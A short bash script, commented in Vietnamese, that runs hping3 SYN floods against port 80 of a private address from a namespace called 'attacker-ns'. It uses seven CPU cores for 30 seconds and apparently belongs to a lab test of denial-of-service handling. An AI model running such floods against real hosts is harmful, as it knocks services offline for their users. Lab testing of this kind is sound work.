#!/bin/bash

# Flood trên tất cả core trừ core 3
for i in 0 1 2 4 5 6 7; do
  sudo taskset -c $i timeout 30s \
    ip netns exec attacker-ns hping3 -S -p 80 --flood 192.168.100.1 >/dev/null 2>&1 &
done

# Chờ tất cả process xong
wait
